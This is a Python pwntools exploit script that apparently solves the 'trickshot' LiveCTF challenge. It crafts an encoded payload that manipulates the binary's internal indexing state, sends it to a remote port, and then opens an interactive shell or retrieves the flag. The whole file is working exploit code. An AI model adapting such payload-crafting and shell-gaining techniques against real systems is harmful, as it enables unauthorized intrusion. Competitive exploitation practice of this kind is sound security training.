#!/usr/bin/env python3
from pwn import *
import ctypes

split = lambda v, sz: [v[i : i + sz] for i in range(0, len(v), sz)]
uu64 = lambda x: u64(x.ljust(8, b"\0")[:8])

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

exe = context.binary = ELF("./handout/trickshot", checksec=False)


def conn() -> tube:
    if args.LOCAL:
        return process([exe.path])
    return remote(HOST, PORT)


d = {
    0: (0,),
    0x39: (0,),
}

a = [b"\x00" * 10 for _ in range(100)]
times = 0
offset = 0
i0, i1 = 0, 0


def set(t, v, k=None):
    global times, i0, i1

    if k is None:
        k = (i0 * i1 + times + offset) % 100
    v = bytes([t]) + v
    v = bytes([(x + times) % 0x100 for x in v])
    print(k, i0, i1)
    a[k] = v

    times += 1
    if t == 4:
        i1 += v[5]
        i0 += 1
    elif t == 16:
        i1 += u16(v[8:10])
        i0 += 2
    elif t == 0x40:
        i1 += u16(v[1:3])
        i0 += 0
    elif t == 0x80:
        i1 += v[9]
        i0 += 4
    i0 = int(ctypes.c_int32(i0).value)
    i1 = int(ctypes.c_int32(i1).value)


a[0] = b"\x01" * 10
offset = 0x101
set(4, b"fUzZ" + p8(0) + b"tHiS")
set(0x80, p32(4294967295) + p32(1) + p8(0))
set(0x40, b"999133777", 0x3B)
set(16, p8(0b01010101) * 9, 5)


payload = b"".join(a)
print(len(payload))

io = conn()
io.recvuntil(b"...\n")
io.sendline(payload)

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline(b"./submitter")
    flag = io.recvline_contains(b"LiveCTF{")
    os.write(1, flag)
